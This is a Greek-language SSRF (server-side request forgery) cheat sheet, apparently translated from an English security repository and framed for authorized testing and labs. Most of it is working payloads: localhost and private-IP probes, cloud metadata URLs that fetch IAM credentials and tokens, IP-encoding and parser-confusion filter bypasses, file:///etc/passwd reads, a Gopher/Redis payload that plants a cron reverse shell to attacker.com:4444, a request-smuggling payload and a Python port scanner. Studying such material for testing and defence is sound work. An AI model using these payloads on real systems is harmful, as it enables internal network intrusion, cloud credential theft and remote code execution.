# 🌐 SSRF — μη επιτρεπόμενα αιτήματα από τον server

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ███████╗███████╗██████╗ ███████╗
  ██╔════╝██╔════╝██╔══██╗██╔════╝
  ███████╗███████╗██████╔╝█████╗  
  ╚════██║╚════██║██╔══██╗██╔══╝  
  ███████║███████║██║  ██║██║     
  ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     
   Μη επιτρεπόμενα αιτήματα από τον server (SSRF)
```

<p align="center">
  <img src="https://img.shields.io/badge/SSRF-Internal_Access-red?style=for-the-badge" alt="SSRF">
  <img src="https://img.shields.io/badge/Cloud-Metadata-blue?style=for-the-badge" alt="Cloud">
  <img src="https://img.shields.io/badge/Bug_Bounty-green?style=for-the-badge" alt="Bug Bounty">
</p>

---

## Πριν ξεκινήσετε

Στο **SSRF** η εφαρμογή δέχεται είσοδο που επηρεάζει πού θα στείλει αίτημα ο ίδιος ο server. Η δικτυακή πρόσβαση του server μπορεί να διαφέρει από τη δική σας, γι’ αυτό η συμπεριφορά χρειάζεται προσεκτική ερμηνεία.

**Βασικοί όροι:** localhost = το ίδιο το σύστημα, private IP = ιδιωτική διεύθυνση δικτύου, metadata = πληροφορίες περιβάλλοντος cloud, blind = αποτέλεσμα που δεν εμφανίζεται άμεσα, callback = επικοινωνία προς υπηρεσία παρατήρησης. Αρχικά εξετάστε ποιο σημείο δέχεται URL και αν γίνεται πραγματικό αίτημα από τον server.

Οι παρακάτω δοκιμές αφορούν εργαστήρια ή στόχους που περιλαμβάνονται ρητά σε εγκεκριμένο έλεγχο. Οι διευθύνσεις, τα διαπιστευτήρια και τα αναγνωριστικά είναι ενδεικτικά. Οι εντολές και τα payloads διατηρούνται από το αγγλικό πρωτότυπο· δεν εκτελούνται κατά τη μετάφραση.

<a id="section-01"></a>

## 🎯 Τι είναι το SSRF

**SSRF** είναι η δυνατότητα πρόκλησης αιτημάτων από τον server προς μη επιτρεπόμενους προορισμούς. Μπορεί να εκθέσει εσωτερικές υπηρεσίες ή metadata cloud.

### Επίπτωση
- 🔴 **Πρόσβαση σε εσωτερικό δίκτυο** — διερεύνηση εσωτερικών υπηρεσιών
- 🔴 **Metadata cloud** — πιθανή έκθεση διαπιστευτηρίων AWS/GCP
- 🔴 **Παράκαμψη φίλτρων δικτύου** — πρόσβαση σε προστατευμένους πόρους
- 🔴 **Εκτέλεση κώδικα (RCE)** — πιθανή σε συγκεκριμένες συνθήκες

---

<a id="section-02"></a>

## 🔍 Πού να αναζητήσετε ενδείξεις

### Συνήθεις παράμετροι
```
url=
uri=
path=
dest=
redirect=
redirect_uri=
next=
data=
reference=
site=
html=
val=
validate=
domain=
callback=
return=
page=
feed=
host=
port=
to=
out=
view=
dir=
```

### Λειτουργίες που χρειάζονται έλεγχο
```
- Λειτουργίες λήψης και ελέγχου URL
- Δημιουργία PDF
- Επεξεργασία εικόνων
- Εισαγωγή αρχείων
- Webhooks
- Διασυνδέσεις APIs
- Συλλογή περιεχομένου web
- Υπηρεσίες στιγμιοτύπων σελίδας
```

---

<a id="section-03"></a>

## 💉 Βασικά δοκιμαστικά payloads

### Τοπικό σύστημα (localhost)
```
http://localhost
http://localhost:80
http://localhost:443
http://localhost:22
http://127.0.0.1
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1
http://0.0.0.0
http://0
http://[::1]
http://[0000::1]
```

### Ιδιωτικά δίκτυα
```
# Ιδιωτικό εύρος 10.0.0.0/8
http://10.0.0.1
http://10.10.10.10
http://10.255.255.255

# Ιδιωτικό εύρος 172.16.0.0/12
http://172.16.0.1
http://172.31.255.255

# Ιδιωτικό εύρος 192.168.0.0/16
http://192.168.0.1
http://192.168.1.1
http://192.168.255.255

# Διεύθυνση link-local
http://169.254.169.254
```

### Συνήθεις θύρες

> **Θύρα και πρωτόκολλο διαφέρουν:** Ένα URL με http δεν μιλά αυτόματα SSH, FTP ή Redis επειδή χρησιμοποιεί τη συνηθισμένη θύρα τους. Διαφορές σφαλμάτων είναι ενδείξεις, όχι αξιόπιστη απόδειξη ανοικτής θύρας.

```
http://127.0.0.1:21    # FTP
http://127.0.0.1:22    # SSH
http://127.0.0.1:23    # Telnet
http://127.0.0.1:25    # SMTP
http://127.0.0.1:80    # HTTP
http://127.0.0.1:443   # HTTPS
http://127.0.0.1:3306  # MySQL
http://127.0.0.1:5432  # PostgreSQL
http://127.0.0.1:6379  # Redis
http://127.0.0.1:27017 # MongoDB
http://127.0.0.1:8080  # Εναλλακτική θύρα HTTP
http://127.0.0.1:9200  # Elasticsearch
```

---

<a id="section-04"></a>

## ☁️ Metadata περιβάλλοντος cloud

> **Προϋποθέσεις cloud:** Τα δείγματα AWS αφορούν IMDSv1· με υποχρεωτικό IMDSv2 χρειάζεται η προβλεπόμενη διαδικασία token. GCP/Azure απαιτούν συγκεκριμένες κεφαλίδες και ισχύουν δικτυακοί περιορισμοί. Μια απλή SSRF δεν εγγυάται δυνατότητα αυθαίρετων μεθόδων ή headers. Επιβεβαιώστε μόνο τον ελάχιστο εγκεκριμένο αντίκτυπο. Πηγή: [AWS — IMDSv1 και IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html).


### AWS
```
# Metadata εικονικής μηχανής με IMDSv1
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# Συγκεκριμένα δεδομένα
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
```

### Google Cloud (GCP)
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/

# Με την απαιτούμενη κεφαλίδα
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

# Απαιτείται κεφαλίδα
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
```

---

<a id="section-05"></a>

## 🛡️ Παραδείγματα παράκαμψης του πρωτοτύπου και περιορισμοί

### Μορφές γραφής διευθύνσεων IP
```
# Δεκαδική μορφή
http://2130706433  # = 127.0.0.1
http://3232235521  # = 192.168.0.1

# Δεκαεξαδική αναπαράσταση (Hex)
http://0x7f000001  # = 127.0.0.1
http://0x7f.0x0.0x0.0x1

# Οκταδική μορφή
http://0177.0.0.01  # = 127.0.0.1
http://0177.0.0.0

# Συνδυασμός τύπων στόχων
http://127.1
http://127.0.1
http://0
```

### Κωδικοποίηση URL
```
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
http://localhost → http://%6c%6f%63%61%6c%68%6f%73%74

# Διπλή κωδικοποίηση
http://%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34
```

### Αλλαγή επίλυσης DNS (DNS rebinding)
```
# Ενδεικτικές υπηρεσίες του πρωτοτύπου:
# - spoofed.burpcollaborator.net
# - 7f000001.rbndr.us  → 127.0.0.1
# - 1.localtest.me → 127.0.0.1

# Ρύθμιση ελεγχόμενου DNS
your-domain.com → 127.0.0.1
```

### Ασυμφωνίες ερμηνείας URL
```
# Παραλλαγή με @
http://attacker.com@127.0.0.1
http://127.0.0.1#@attacker.com
http://127.0.0.1?@attacker.com
http://attacker.com\@127.0.0.1

# Τμήματα fragment
http://127.0.0.1#.attacker.com
http://127.0.0.1?.attacker.com

# Ανάστροφη κάθετος
http://attacker.com\127.0.0.1
```

### Δοκιμή εναλλακτικών πρωτοκόλλων
```
# Αρχείο
file:///etc/passwd
file://127.0.0.1/etc/passwd

# Πρωτόκολλο Gopher
gopher://127.0.0.1:6379/_INFO

# Πρωτόκολλο Dict
dict://127.0.0.1:6379/INFO

# LDAP
ldap://127.0.0.1:389

# TFTP
tftp://127.0.0.1/file.txt
```

### Αλυσίδα μέσω open redirect
```
# Αν υπάρχει επιβεβαιωμένο open redirect:
https://target.com/redirect?url=http://169.254.169.254/

# Ανακατεύθυνση σε εσωτερικό προορισμό
http://target.com/redirect?url=http://127.0.0.1:8080
```

### Παραλλαγές διευθύνσεων IPv6
```
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[::ffff:127.0.0.1]
http://[::]
```

### Εισαγωγή δεδομένων σε κεφαλίδες
```
# Εισαγωγή CRLF στο URL
http://attacker.com%0d%0aHost:%20127.0.0.1%0d%0a
```

---

<a id="section-06"></a>

## 🔥 Εκμετάλλευση ευπαθειών

> **Ενδεικτικά και εξαρτώμενα από υλοποίηση:** Το πολυγραμμικό Redis/Gopher δείγμα δεν είναι γενικό έτοιμο payload και προϋποθέτει συγκεκριμένες ρυθμίσεις. Η αποστολή ενός HTTP αιτήματος μέσω SSRF δεν αποτελεί από μόνη της HTTP request smuggling. Ο έλεγχος θυρών που βασίζεται σε μια φράση σφάλματος μπορεί να δίνει ψευδή αποτελέσματα.


### Παράδειγμα Redis μέσω Gopher με πιθανή εκτέλεση κώδικα
```
# Παράδειγμα δοκιμαστικής εισόδου
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a
*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1
%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

### Ασυμφωνία ερμηνείας αιτημάτων HTTP (request smuggling)
```
gopher://127.0.0.1:80/_POST%20/internal/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2020%0d%0a%0d%0acommand=id
```

### Σάρωση θυρών
```python
import requests

target = "https://vulnerable.com/fetch?url="
ports = [21, 22, 23, 25, 80, 443, 3306, 6379, 8080]

for port in ports:
    url = f"{target}http://127.0.0.1:{port}"
    r = requests.get(url, timeout=5)
    if "connection refused" not in r.text.lower():
        print(f"[OPEN] Port {port}")
```

---

<a id="section-07"></a>

## 📊 Γρήγορη αναφορά

### Ανίχνευση

> **Εξωτερική επικοινωνία:** Ένα DNS callback αποδεικνύει επίλυση ονόματος από κάποιο σχετικό σύστημα, όχι αναγκαστικά ανάγνωση HTTP από την εφαρμογή. Συσχετίστε μοναδικό αναγνωριστικό δοκιμής, χρόνο και τύπο επικοινωνίας. Τα δημόσια domains του πρωτοτύπου είναι παραδείγματα, όχι δικές σας υπηρεσίες.

```
# Έλεγχος για SSRF
?url=http://burpcollaborator.net
?url=http://webhook.site/xxxx

# Εξέταση αποτελέσματος
- Λήφθηκε ερώτημα DNS;
- Λήφθηκε αίτημα HTTP;
- Υπάρχει διαφορετική απόκριση για εσωτερικές IP;
```

### Ενδεικτικά επίπεδα αντίκτυπου

> **Η σοβαρότητα δεν προκύπτει από τον τίτλο:** Αξιολογήστε ποια δεδομένα ή ενέργειες είναι πραγματικά προσβάσιμα. Οι παραλλαγές IP, URL και πρωτοκόλλων εξαρτώνται από parser και client και δεν είναι καθολικές παρακάμψεις.


| Στόχος | Επίπτωση |
| -------- | -------- |
| Metadata περιβάλλοντος cloud | Πιθανώς κρίσιμο — έκθεση διαπιστευτηρίων |
| Εσωτερικά APIs | Πιθανώς υψηλό — πρόσβαση σε δεδομένα |
| Εσωτερικές υπηρεσίες | Πιθανώς υψηλό — δυνατότητα εκτέλεσης κώδικα |
| Σάρωση θυρών | Πιθανώς μέτριο — αποκάλυψη πληροφοριών |

### Συνήθη φίλτρα και παραλλαγές προς έλεγχο

| Φίλτρο | Ενδεικτική προσέγγιση του πρωτοτύπου |
| -------- | -------- |
| Αποκλεισμός του `localhost` | Παραλλαγές `127.0.0.1`, `0`, `[::1]` |
| Αποκλεισμός του `127.0.0.1` | Δεκαδική μορφή `2130706433` |
| Αποκλεισμός ιδιωτικών IP | Έλεγχος DNS rebinding |
| Επιτρέπεται μόνο HTTP | Δοκιμές με `gopher://`, `file://` όπου υποστηρίζονται |
| Λίστα επιτρεπόμενων domains | Παραλλαγή με `@` ή open redirect |

---

<a id="section-08"></a>

## 🛠️ Εργαλεία

```bash
# SSRFmap
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Gopherus — δημιουργία εισόδων Gopher
python gopherus.py --exploit redis

# Υπηρεσία callbacks για τυφλό SSRF
# - Burp Collaborator
# - webhook.site
# - requestbin.com
```

---

<a id="section-09"></a>

## 📚 Πηγές

- [PortSwigger — SSRF](https://portswigger.net/web-security/ssrf)
- [Οδηγός πρόληψης SSRF](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings — SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

---

<p align="center">
  <b>🌐 Μελετήστε και επαληθεύστε το SSRF!</b><br>
  <i>Μόνο για εξουσιοδοτημένους ελέγχους!</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
